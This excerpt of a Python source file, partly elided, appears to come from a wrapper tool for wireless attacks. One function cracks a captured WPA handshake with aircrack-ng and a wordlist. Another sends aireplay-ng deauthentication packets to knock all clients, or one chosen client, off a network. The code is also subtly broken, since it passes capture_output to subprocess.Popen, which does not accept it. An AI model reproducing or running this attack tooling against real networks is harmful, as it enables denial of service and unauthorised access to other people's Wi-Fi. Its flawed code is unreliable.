...
def crack_handshake():
    ...
    output = subprocess.Popen(["sudo", "aircrack-ng", "handshake.pcap", "-w", wordlist], capture_output=True, text=True)
    console.print(output.stdout, justify="center")
...
def deauth(device, bssid):
    ...
    if target == "All":
        output = subprocess.Popen(["sudo", "aireplay-ng", "-0", number_of_packets, "-a", bssid, device], capture_output=True, text=True)
    elif target == "One":
        client = Prompt.ask("Please enter the client's MAC address")
        output = subprocess.Popen(["sudo", "aireplay-ng", "-0", number_of_packets, "-a", bssid, "-c", client, device], capture_output=True, text=True)
